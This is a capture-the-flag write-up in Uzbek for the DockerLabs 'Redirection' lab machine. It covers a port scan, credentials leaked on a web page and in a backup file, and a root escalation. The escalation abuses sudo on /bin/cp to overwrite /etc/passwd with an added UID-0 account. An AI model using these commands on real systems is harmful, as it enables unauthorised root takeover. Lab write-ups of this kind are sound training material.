# Redirection-dockerlabs

```
IP: 172.17.0.2
OS: Linux
Ports: 22 SSH, 80 http
Users: balu, balulito, root
Vulnerability: Leaked credentials, sudo misconfiguration (/bin/cp)
```

## root flag:
> 📸 Screenshot (Notion sahifasida)

## user flag:
> 📸 Screenshot (Notion sahifasida)

---

# 1. Enumeration

Mashinamiz nomi `Redirection`. Berilgan IP orqali `nmap` buyrug'i yordamida ochiq portlarni aniqlab oldim.

```bash
nmap -sV -sC -A -p- --min-rate 1000 172.17.0.2
```

Natijada 2ta port ochiq ekan:
- 22 SSH
- 80 http

Brauzerda 80 portda qanday web sahifa ishlab turganini bilish uchun ochdim. Bu yerda labaratoriya bor ekan, redirection bo'yicha. Sahifada 3 ta tugma bor, barchasi labaratoriya sahifalariga olib o'rar ekan.

Birinchi, ikkinchi va uchinchi labaratoriyalar barchasi tashqi sahifaga (google.com) yo'naltirdi.

Asosiy sahifadagi sariq knopkani bosib ko'rsam menga user credentiallarini berdi: **balu:balulero**

---

# 2. Initial Access

Topilgan credentialdan foydalanib tizimga SSH orqali kirdim.

`balu` useri orqali `root` huquqini olish imkoni bo'lmadi. Qidirishlarim davomida root papkada `secret.bak` fayliga ko'zim tushdi. Uni ichida boshqa user credentiallari turibti: **balulito:balulerochingon**

Topilgan credentialdan foydalanib `balulito` useriga o'tib oldim.

`balulito` userida root nomidan `/bin/cp` buyrug'ini ishga tushirish imkoni bor ekan.

---

# 3. Privilege Escalation

`/bin/cp` sudo huquqidan foydalanib `/etc/passwd` faylini tahrirlash orqali root huquqi oldim.

```bash
# Yangi foydalanuvchi paroli 'admin'. Uning hashini oldim.
openssl passwd -1 -salt xaker admin

# /passwd faylini nusxalash
cp /etc/passwd /tmp/passwd

# Yaratgan parol hashini /passwd fayliga qo'shdim
echo 'admin2:$1$xaker$XncSbC4w.bUDTnQF0Ghjw0:0:0:root:/root:/bin/bash' >> /tmp/passwd

# Asl faylga almashtirdim
sudo /bin/cp /tmp/passwd /etc/passwd

# Yaratgan userimga o'tdim
su admin2
# password: admin
```

Yaratgan userimga `admin2:admin` credential orqali o'tdim va `root` huquqiga ega bo'ldim.

---

**Mashina muvofaqiyatli yechildi!**
